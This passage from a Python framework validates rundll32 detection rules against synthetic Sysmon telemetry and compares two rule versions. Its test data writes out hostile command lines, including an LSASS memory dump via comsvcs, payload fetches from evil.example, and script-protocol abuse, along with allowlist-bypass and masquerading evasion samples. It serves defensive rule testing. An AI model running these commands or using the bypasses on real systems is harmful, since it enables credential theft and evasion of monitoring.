  <div class="cm-cell cm-fp">{cm["FP"]}<span class="cm-sub">False Positives</span></div>
  <div class="cm-cell cm-fn">{cm["FN"]}<span class="cm-sub">False Negatives</span></div>
  <div class="cm-cell cm-tn">{cm["TN"]}<span class="cm-sub">True Negatives</span></div>
</div>

<h2>Category Breakdown</h2>
{cat_html or "<p>No category data.</p>"}

<h2>🔧 Recommendations ({len(recs)} items · {critical_n} critical/high)</h2>
{recs_html or '<p style="color:#10b981">✓ No issues found.</p>'}

<h2>Evasion Analysis &nbsp;<span style="font-weight:400;color:#475569">
  ({m["evasion_caught"]}/{m["evasion_total"]} caught — {ev_r_str})</span></h2>
{evasion_html or "<p>No evasion events in this run.</p>"}

<h2>All Results &nbsp;<span style="font-weight:400;color:#475569">
  ({m["total_passed"]}/{m["total_events"]} passed)</span></h2>
<table>
<thead><tr><th>ID</th><th>Category</th><th>Description</th>
<th>Expected</th><th>Actual</th><th>Conf</th><th>Result</th></tr></thead>
<tbody>{rows_html}</tbody>
</table>

<h2>Failure Details &nbsp;<span style="font-weight:400;color:#475569">
  ({len(self.get_failures())} events)</span></h2>
{failures_html or '<p style="color:#10b981">✓ Zero failures.</p>'}

</body></html>"""

        with open(path, "w", encoding="utf-8") as fh:
            fh.write(html)


# ═══════════════════════════════════════════════════════════════════════════════
# RULE COMPARATOR  (A/B testing)
# ═══════════════════════════════════════════════════════════════════════════════

class RuleComparator:
    """
    Compare two detection engine versions against the same test dataset.

    FIX v3: compare() result is now cached — calling print_comparison()
    no longer re-runs both engines a second time, wasting CPU and potentially
    producing different results if the generator uses randomness.
    """

    def __init__(
        self,
        engine_a: DetectionEngine,
        engine_b: DetectionEngine,
        events:   list[SyntheticEvent],
        grading:  Optional[GradingConfig] = None,
    ):
        self.runner_a = TestRunner(engine_a, events, grading)
        self.runner_b = TestRunner(engine_b, events, grading)
        self._report: Optional[dict] = None  # cache

    def compare(self) -> dict:
        """
        Run both engines and return a side-by-side comparison report.
        Result is cached — subsequent calls return the same dict.
        """
        if self._report is not None:
            return self._report

        self.runner_a.run()
        self.runner_b.run()

        m_a = self.runner_a.get_metrics()
        m_b = self.runner_b.get_metrics()

        diffs = []
        for ra, rb in zip(self.runner_a.results, self.runner_b.results):
            if ra.outcome != rb.outcome:
                diffs.append({
                    "event_id":            ra.event.event_id,
                    "description":         ra.event.description,
                    "category":            ra.event.category.value,
                    "engine_a_outcome":    ra.outcome,
                    "engine_b_outcome":    rb.outcome,
                    "engine_a_matched":    ra.detection.matched,
                    "engine_b_matched":    rb.detection.matched,
                    "engine_a_conditions": ra.detection.matched_conditions,
                    "engine_b_conditions": rb.detection.matched_conditions,
                })

        _METRIC_KEYS = ["accuracy", "precision", "recall",
                         "f1_score", "evasion_resistance", "composite_score"]
        deltas = {
            k: round(
                (m_b[k] or 0) - (m_a[k] or 0),   # guard None evasion_resistance
                4,
            )
            for k in _METRIC_KEYS
        }

        self._report = {
            "engine_a":     {"name": self.runner_a.engine.rule_name, "metrics": m_a},
            "engine_b":     {"name": self.runner_b.engine.rule_name, "metrics": m_b},
            "deltas":       deltas,
            "outcome_diffs": diffs,
            "total_diffs":   len(diffs),
            "verdict":       self._verdict(deltas),
        }
        return self._report

    @staticmethod
    def _verdict(deltas: dict) -> str:
        d = deltas.get("composite_score", 0)
        if   d >  0.05: return "SIGNIFICANT_IMPROVEMENT"
        elif d >  0:    return "MARGINAL_IMPROVEMENT"
        elif d == 0:    return "NO_CHANGE"
        elif d > -0.05: return "MARGINAL_REGRESSION"
        else:           return "SIGNIFICANT_REGRESSION"

    def print_comparison(self) -> None:
        """Print a formatted side-by-side comparison. Uses cached compare()."""
        report = self.compare()
        a      = report["engine_a"]
        b      = report["engine_b"]
        W      = 80

        print("=" * W)
        print("  RULE COMPARISON REPORT  (A/B)")
        print("=" * W)
        print(f"\n  Engine A : {a['name']}")
        print(f"  Engine B : {b['name']}")
        print(f"\n  {'Metric':<26} {'Engine A':>12} {'Engine B':>12} {'Delta':>10}")
        print(f"  {'─' * 62}")

        for key in ["accuracy", "precision", "recall", "f1_score",
                    "evasion_resistance", "composite_score"]:
            va    = a["metrics"][key] or 0
            vb    = b["metrics"][key] or 0
            delta = report["deltas"][key]
            arrow = "▲" if delta > 0 else ("▼" if delta < 0 else " ")
            print(f"  {key:<26} {va:>11.1%} {vb:>11.1%} {arrow}{delta:>+8.1%}")

        print(f"\n  Grade   : {a['metrics']['overall_grade']}  →  {b['metrics']['overall_grade']}")
        print(f"  Verdict : {report['verdict']}")

        if report["outcome_diffs"]:
            print(f"\n  Events with different outcomes ({report['total_diffs']}):")
            for d in report["outcome_diffs"]:
                print(f"    {d['event_id']}: {d['engine_a_outcome']} → {d['engine_b_outcome']}"
                      f"  ({d['description'][:48]})")

        print(f"\n{'=' * W}\n")


# ═══════════════════════════════════════════════════════════════════════════════
# EXAMPLE — Rundll32 Detection  (Sigma-style, Sysmon EventID 1)
# ═══════════════════════════════════════════════════════════════════════════════

class ExampleRundll32Generator(TelemetryGenerator):
    """
    Generates realistic Sysmon EventID 1 telemetry for a Rundll32 proxy-execution
    detection rule.  Used by the CLI demo and unit tests.
    """

    def generate_true_positives(self, count: int = 10) -> list[SyntheticEvent]:
        malicious = [
            (r'C:\Windows\System32\rundll32.exe javascript:\"\..\mshtml,RunHTMLApplication\";',
             "rundll32 javascript: protocol abuse"),
            (r"rundll32.exe C:\Users\Public\payload.dll,DllMain",
             "rundll32 loading DLL from Public"),
            (r"C:\Windows\System32\rundll32.exe C:\Temp\beacon.dll,Start",
             "rundll32 C:\\Temp DLL staging"),
            (r"rundll32.exe \\10.0.0.5\share\malware.dll,Entry",
             "rundll32 UNC share DLL load"),
            (r'C:\WINDOWS\system32\rundll32.exe vbscript:\"\..\mshtml,RunHTMLApplication\"',
             "rundll32 vbscript: protocol abuse"),
            (r"rundll32 C:\ProgramData\update.dll,#1",
             "rundll32 ProgramData ordinal export"),
            (r"C:\Windows\System32\rundll32.exe advpack.dll,LaunchINFSection",
             "rundll32 advpack INF abuse (T1218.011)"),
            (r"rundll32.exe url.dll,FileProtocolHandler http://evil.example/payload",
             "rundll32 url.dll HTTP handler"),
            (r"rundll32.exe zipfldr.dll,RouteTheCall C:\Temp\evil.exe",
             "rundll32 zipfldr route-call"),
            (r"C:\Windows\System32\rundll32.exe comsvcs.dll MiniDump 624 C:\temp\lsass.dmp full",
             "rundll32 comsvcs LSASS dump (T1003.001)"),
            (r"rundll32.exe pcwutl.dll,LaunchApplication calc.exe",
             "rundll32 pcwutl LOLBin"),
            (r"C:\Windows\System32\rundll32.exe shdocvw.dll,OpenURL http://evil.example",
             "rundll32 shdocvw OpenURL"),
        ]
        parents = [
            r"C:\Windows\System32\cmd.exe",
            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            r"C:\Windows\explorer.exe",
            r"C:\Windows\System32\wscript.exe",
            r"C:\Windows\System32\mshta.exe",
        ]
        events = []
        for i in range(min(count, len(malicious))):
            cmdline, desc = malicious[i]
            base = self._base_sysmon_event(1)
            base["Image"]            = r"C:\Windows\System32\rundll32.exe"
            base["OriginalFileName"] = "RUNDLL32.EXE"
            base["CommandLine"]      = cmdline
            base["ParentImage"]      = self.rng.choice(parents)
            base["ParentCommandLine"] = base["ParentImage"].split("\\")[-1]
            events.append(SyntheticEvent(
                event_id          = self._next_id(),
                category          = EventCategory.TRUE_POSITIVE,
                description       = desc,
                log_data          = base,
                attack_technique  = "T1218.011",
                expected_detection= True,
                notes             = f"Rundll32 proxy execution: {cmdline[:60]}",
                tags              = ["rundll32", "proxy_execution", "lolbin"],
            ))
        return events

    def generate_true_negatives(self, count: int = 15) -> list[SyntheticEvent]:
        benign = [
            (r"C:\Windows\System32\svchost.exe",          "svchost.exe -k netsvcs -p"),
            (r"C:\Windows\explorer.exe",                  "C:\\Windows\\explorer.exe"),
            (r"C:\Windows\System32\notepad.exe",          "notepad.exe C:\\Users\\admin\\notes.txt"),
            (r"C:\Windows\System32\cmd.exe",              "cmd.exe /c dir C:\\Users"),
            (r"C:\Program Files\Google\Chrome\Application\chrome.exe", "chrome.exe --type=renderer"),
            (r"C:\Windows\System32\taskmgr.exe",          "taskmgr.exe"),
            (r"C:\Windows\System32\mmc.exe",              "mmc.exe eventvwr.msc"),
            (r"C:\Windows\System32\wbem\wmiprvse.exe",    "wmiprvse.exe"),
            (r"C:\Windows\System32\dllhost.exe",
             r"dllhost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}"),
            (r"C:\Windows\System32\conhost.exe",          "conhost.exe 0x4"),
            (r"C:\Program Files\7-Zip\7z.exe",            "7z.exe a archive.zip files"),
            (r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
             "powershell.exe -Command Get-Date"),
            (r"C:\Windows\System32\mstsc.exe",            "mstsc.exe /v:server01"),
            (r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE", "WINWORD.EXE /n"),
            (r"C:\Windows\System32\dwm.exe",              "dwm.exe"),
        ]
        events = []
        for i in range(min(count, len(benign))):
            image, cmdline = benign[i]
            base = self._base_sysmon_event(1)
            base["Image"]       = image
            base["CommandLine"] = cmdline
            base["ParentImage"] = r"C:\Windows\explorer.exe"
            events.append(SyntheticEvent(
                event_id          = self._next_id(),
                category          = EventCategory.TRUE_NEGATIVE,
                description       = f"Benign: {image.split(chr(92))[-1]}",
                log_data          = base,
                expected_detection= False,
                tags              = ["benign"],
            ))
        return events

    def generate_fp_candidates(self, count: int = 5) -> list[SyntheticEvent]:
        legit = [
            (r"rundll32.exe shell32.dll,Control_RunDLL intl.cpl",
             "shell32 Control Panel — legit"),
            (r"rundll32.exe setupapi.dll,InstallHinfSection",
             "setupapi INF install — legit"),
            (r"C:\Windows\System32\rundll32.exe shell32.dll,SHCreateLocalServerRunDll",
             "shell32 COM server — legit"),
            (r"rundll32.exe shell32.dll,Options_RunDLL 0",
             "shell32 folder options — legit"),
            (r"rundll32.exe printui.dll,PrintUIEntry /il",
             "printui printer installer — legit"),
            (r"rundll32.exe user32.dll,LockWorkStation",
             "user32 lock workstation — legit"),
            (r"C:\Windows\System32\rundll32.exe setupapi.dll,SetupChangeFontSize",
             "setupapi font size — legit"),
        ]
        events = []
        for i in range(min(count, len(legit))):
            cmdline, desc = legit[i]
            base = self._base_sysmon_event(1)
            base["Image"]            = r"C:\Windows\System32\rundll32.exe"
            base["OriginalFileName"] = "RUNDLL32.EXE"
            base["CommandLine"]      = cmdline
            base["ParentImage"]      = r"C:\Windows\explorer.exe"
            events.append(SyntheticEvent(
                event_id          = self._next_id(),
                category          = EventCategory.FALSE_POSITIVE_CANDIDATE,
                description       = desc,
                log_data          = base,
                expected_detection= False,
                notes             = "Legitimate Windows rundll32 usage — should be filtered by allowlist",
                tags              = ["rundll32", "legitimate", "fp_candidate"],
            ))
        return events

    def generate_evasion_samples(self, count: int = 5) -> list[SyntheticEvent]:
        evasion_variants = [
            {
                "image":    r"C:\Temp\notmalware.exe",
                "cmdline":  r"notmalware.exe C:\Temp\beacon.dll,Start",
                "ofn":      "RUNDLL32.EXE",
                "desc":     "Renamed binary — OriginalFileName still RUNDLL32.EXE",
                "tags":     ["renamed_binary", "pe_metadata"],
                "note":     "Relies on OriginalFileName check; Image-only rules miss this.",
            },
            {
                "image":    r"C:\Windows\SysWOW64\rundll32.exe",
                "cmdline":  r"C:\Windows\SysWOW64\rundll32.exe C:\Temp\payload32.dll,Run",
                "ofn":      "RUNDLL32.EXE",
                "desc":     "SysWOW64 path — 32-bit variant on 64-bit host",
                "tags":     ["syswow64", "path_evasion"],
                "note":     "Rule must match both System32 and SysWOW64 paths.",
            },
            {
                "image":    r"C:\Windows\System32\rundll32.exe",
                "cmdline":  r'rundll32.exe "\\fileserver\share\pay load.dll",Entry',
                "ofn":      "RUNDLL32.EXE",
                "desc":     "UNC path with space in filename",
                "tags":     ["unc_path", "spaces"],
                "note":     "Spaces in DLL path can confuse simple string matchers.",
            },
            {
                "image":    r"C:\Windows\System32\rundll32.exe",
                "cmdline":  r"rundll32.exe %TEMP%\update.dll,DllRegisterServer",
                "ofn":      "RUNDLL32.EXE",
                "desc":     "Environment-variable path substitution",
                "tags":     ["env_variable"],
                "note":     "Rules matching literal paths miss %-expanded paths.",
            },
            {
                "image":    r"C:\Windows\System32\rundll32.exe",
                "cmdline":  r"rundll32 shell32.dll\,Control_RunDLL ..\..\Temp\evil.cpl",
                "ofn":      "RUNDLL32.EXE",
                "desc":     "Escaped comma + path traversal in shell32 allowlist bypass",
                "tags":     ["filter_bypass", "path_traversal"],
                "note":     "shell32.dll is in the allowlist but the traversal is malicious.",
            },
            {
                "image":    r"C:\Users\Public\svchost.exe",
                "cmdline":  r"svchost.exe C:\Users\Public\implant.dll,Run",
                "ofn":      "RUNDLL32.EXE",
                "desc":     "Masquerading as svchost.exe (OriginalFileName = RUNDLL32.EXE)",
                "tags":     ["renamed_binary", "masquerade"],
                "note":     "Doubly evasive — wrong image name AND suspicious path.",
            },
            {
                "image":    r"C:\Windows\System32\rundll32.exe",
                "cmdline":  r"C:\Windows\System32\rundll32.exe C:\TEMP\BEACON.DLL,START",
                "ofn":      "RUNDLL32.EXE",
                "desc":     "All-caps DLL path — case manipulation",
                "tags":     ["case_manipulation"],
                "note":     "Case-sensitive rules miss this variant.",
            },
        ]
        events = []
        for i in range(min(count, len(evasion_variants))):
            v    = evasion_variants[i]
            base = self._base_sysmon_event(1)
            base["Image"]            = v["image"]
            base["CommandLine"]      = v["cmdline"]
            base["OriginalFileName"] = v["ofn"]
            base["ParentImage"]      = r"C:\Windows\System32\cmd.exe"
            events.append(SyntheticEvent(
                event_id          = self._next_id(),
                category          = EventCategory.EVASION,
                description       = v["desc"],
                log_data          = base,
                attack_technique  = "T1218.011",
                expected_detection= True,
                notes             = v["note"],
                tags              = v.get("tags", []),
            ))
        return events


class ExampleRundll32Engine(DetectionEngine):
    """
    ORIGINAL rule  (v1).

    Sigma equivalent:
        selection:
            Image|endswith: '\\rundll32.exe'
        filter:
            CommandLine|contains:
                - 'shell32.dll'
                - 'setupapi.dll'
        condition: selection and not filter

    Known weaknesses:
      - Misses renamed binaries (OriginalFileName not checked).
      - Filter naively allows shell32.dll even in malicious contexts.
      - Misses SysWOW64 path variant.
    """

    def __init__(self):
        super().__init__(
            rule_name="Suspicious Rundll32 (v1 — Original)",
            rule_metadata={
                "format":       "Sigma",
                "mitre_attack": ["T1218.011"],
                "severity":     "medium",
                "log_source":   "Sysmon EventID 1",
                "version":      "1.0",
            },
        )

    def evaluate(self, event: dict) -> DetectionResult:
        matched = []

        # Selection
        sel = self.field_endswith(event, "Image", "\\rundll32.exe")
        if sel:
            matched.append("Image|endswith:'\\\\rundll32.exe'")

        # Filter
        f_shell   = self.field_contains(event, "CommandLine", "shell32.dll")
        f_setup   = self.field_contains(event, "CommandLine", "setupapi.dll")
        filtered  = f_shell or f_setup
        if f_shell:  matched.append("filter:CommandLine|contains:'shell32.dll'")
        if f_setup:  matched.append("filter:CommandLine|contains:'setupapi.dll'")

        final = sel and not filtered

        confidence = 0.0
        if final:
            confidence = 0.70
            cmdline = self.nested_get(event, "CommandLine").lower()
            if any(s in cmdline for s in ["javascript:", "vbscript:", "comsvcs", "minidump"]):
                confidence = 0.95
            elif any(s in cmdline for s in [".dll,", "\\temp\\", "\\public\\", "\\programdata\\"]):
                confidence = 0.85

        return DetectionResult(
            event_id="", matched=final,
            matched_conditions=matched, confidence_score=round(confidence, 2),
        )


class ImprovedRundll32Engine(DetectionEngine):
    """
    IMPROVED rule  (v2).

    Changes from v1:
      1. Checks OriginalFileName == 'RUNDLL32.EXE' (catches renamed binaries).
      2. Allowlist is context-aware: benign DLLs only suppress if no
         traversal / escaped-comma abuse indicators are also present.
      3. Adds printui.dll and user32.dll,LockWorkStation to the allowlist.
      4. Suspicious parent process detection as a confidence booster.

    Sigma equivalent:
        selection_image:
            Image|endswith: '\\rundll32.exe'
        selection_ofn:
            OriginalFileName: 'RUNDLL32.EXE'
        filter_benign:
            CommandLine|contains:
                - 'shell32.dll'
                - 'setupapi.dll'
                - 'printui.dll'
                - 'user32.dll,LockWorkStation'
        filter_abuse:
            CommandLine|contains:
                - '..\\'
                - '../'
                - '\\,'
                - '/,'
        condition: (selection_image or selection_ofn) and
                   not (filter_benign and not filter_abuse)
    """

    _BENIGN_DLLS = [
        "shell32.dll", "setupapi.dll", "printui.dll",
        "user32.dll,lockworkstation",
    ]
    _ABUSE_INDICATORS = ["..", "\\,", "/,"]
    _SUSPICIOUS_PARENTS = [
        "\\wscript.exe", "\\cscript.exe", "\\mshta.exe",
        "\\winword.exe", "\\excel.exe", "\\powershell.exe",
        "\\python.exe", "\\pythonw.exe",
    ]

    def __init__(self):
        super().__init__(
            rule_name="Suspicious Rundll32 (v2 — Improved)",
            rule_metadata={
                "format":       "Sigma",
                "mitre_attack": ["T1218.011"],
                "severity":     "medium",
                "log_source":   "Sysmon EventID 1",
                "version":      "2.0",
            },
        )

    def evaluate(self, event: dict) -> DetectionResult:
        matched = []

        # Selection: Image path OR OriginalFileName
        sel_image = self.field_endswith(event, "Image", "\\rundll32.exe")
        sel_ofn   = self.check_original_filename(event, "RUNDLL32.EXE")
        selection = sel_image or sel_ofn

        if sel_image: matched.append("Image|endswith:'\\\\rundll32.exe'")
        if sel_ofn and not sel_image:
            matched.append("OriginalFileName=='RUNDLL32.EXE' (renamed binary!)")

        if not selection:
            return DetectionResult(event_id="", matched=False, matched_conditions=matched)

        cmdline_lower = self.nested_get(event, "CommandLine").lower()

        # Filter: benign DLL usage
        benign_match = any(dll in cmdline_lower for dll in self._BENIGN_DLLS)
        if benign_match:
            matched.append("filter:CommandLine contains benign DLL pattern")

        # Anti-abuse override: traversal / escaped-comma within benign DLL call
        abuse_match = any(ind in cmdline_lower for ind in self._ABUSE_INDICATORS)
        if abuse_match:
            matched.append("anti_abuse:traversal/escape indicator in CommandLine")

        # Logic: suppress only when benign WITHOUT abuse
        final = not (benign_match and not abuse_match)

        # Confidence scoring
        confidence = 0.0
        if final:
            confidence = 0.70
            if any(s in cmdline_lower for s in [
                "javascript:", "vbscript:", "http://", "https://",
                "comsvcs", "minidump", "runhtmlapplication",
            ]):
                confidence = 0.95
            elif any(s in cmdline_lower for s in [
                ".dll,", "\\temp\\", "\\public\\", "\\programdata\\", "\\users\\",
            ]):
                confidence = 0.85

            # Boosts
            if sel_ofn and not sel_image:
                confidence = min(confidence + 0.10, 1.0)
                matched.append("boost:renamed_binary")

            parent = self.nested_get(event, "ParentImage").lower()
            if any(p in parent for p in self._SUSPICIOUS_PARENTS):
                confidence = min(confidence + 0.05, 1.0)
                matched.append("boost:suspicious_parent")

        return DetectionResult(
            event_id="", matched=final,
            matched_conditions=matched, confidence_score=round(confidence, 2),
        )


# ═══════════════════════════════════════════════════════════════════════════════
# CLI ENTRY POINT
# ═══════════════════════════════════════════════════════════════════════════════

def main() -> None:
    parser = argparse.ArgumentParser(
        description=f"Detection Rule Validation Framework v{__version__}",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python detection_validator.py                           # Built-in Rundll32 demo
  python detection_validator.py --engine improved         # Improved engine demo
  python detection_validator.py --compare                 # A/B comparison
  python detection_validator.py --events data.json        # Load events from file
  python detection_validator.py --html report.html        # Export HTML report
  python detection_validator.py --json report.json        # Export JSON report
  python detection_validator.py --csv  report.csv         # Export CSV report
  python detection_validator.py --export-events out.json  # Save generated events
  python detection_validator.py --tp 20 --tn 30 --seed 7  # Custom event counts
""",
    )
    parser.add_argument(
        "--engine", choices=["original", "improved"], default="original",
        help="Which engine version to run (default: original)",
    )
    parser.add_argument(
        "--compare", action="store_true",
        help="Run both engines side-by-side and print comparison",
    )
    parser.add_argument(
        "--events", type=str, default=None,
        help="Load test events from a JSON file instead of generating",
    )
    parser.add_argument(
        "--export-events", type=str, default=None,
        help="Save generated events to a JSON file",
    )
    parser.add_argument(
        "--json", type=str, default=None,
        help="Export full report to a JSON file",
    )
    parser.add_argument(
        "--html", type=str, default=None,
        help="Export full report to an HTML file",
    )
    parser.add_argument(
        "--csv", type=str, default=None,
        help="Export full report to a CSV file",
    )
    parser.add_argument("--tp",     type=int, default=10, help="True positive count  (default: 10)")
    parser.add_argument("--tn",     type=int, default=15, help="True negative count  (default: 15)")
    parser.add_argument("--fp",     type=int, default=5,  help="FP candidate count   (default:  5)")
    parser.add_argument("--evasion",type=int, default=5,  help="Evasion sample count (default:  5)")
    parser.add_argument("--seed",   type=int, default=42, help="Random seed (default: 42)")
    parser.add_argument("--quiet",  action="store_true",  help="Suppress console report")
    args = parser.parse_args()

    # ── Load or generate events ───────────────────────────────────────────────
    if args.events:
        try:
            events = TelemetryGenerator.import_events(args.events)
            print(f"✓ Loaded {len(events)} events from {args.events}")
        except (FileNotFoundError, ValidationError) as exc:
            print(f"✗ Error loading events: {exc}", file=sys.stderr)
            sys.exit(1)
    else:
        generator = ExampleRundll32Generator(seed=args.seed)
        events    = generator.generate_all(
            tp=args.tp, tn=args.tn, fp=args.fp, evasion=args.evasion,
        )
        print(f"✓ Generated {len(events)} synthetic events  (seed={args.seed})")

    # FIX v3: use existing generator instance, not a fresh TelemetryGenerator base
    if args.export_events:
        generator_for_export = (
            generator if not args.events else TelemetryGenerator(seed=args.seed)
        )
        generator_for_export.export_events(events, args.export_events)
        print(f"✓ Events saved to {args.export_events}")

    # ── Comparison mode ───────────────────────────────────────────────────────
    if args.compare:
        engine_a   = ExampleRundll32Engine()
        engine_b   = ImprovedRundll32Engine()
        comparator = RuleComparator(engine_a, engine_b, events)
        comparator.print_comparison()
        if args.json:
            with open(args.json, "w", encoding="utf-8") as fh:
                json.dump(comparator.compare(), fh, indent=2)
            print(f"✓ Comparison JSON saved to {args.json}")
        return

    # ── Single engine mode ────────────────────────────────────────────────────
    engine = ImprovedRundll32Engine() if args.engine == "improved" else ExampleRundll32Engine()
    runner = TestRunner(engine=engine, events=events)
    runner.run()

    if not args.quiet:
        runner.print_report()   # auto-generates basic recommendations

    if args.json:
        report = runner.export_report_json()
        with open(args.json, "w", encoding="utf-8") as fh:
            json.dump(report, fh, indent=2)
        print(f"✓ JSON report saved to {args.json}")

    if args.html:
        runner.export_html_report(args.html)
        print(f"✓ HTML report saved to {args.html}")

    if args.csv:
        csv_data = runner.export_csv()
        with open(args.csv, "w", encoding="utf-8", newline="") as fh:
            fh.write(csv_data)
        print(f"✓ CSV report saved to {args.csv}")


if __name__ == "__main__":
    main()
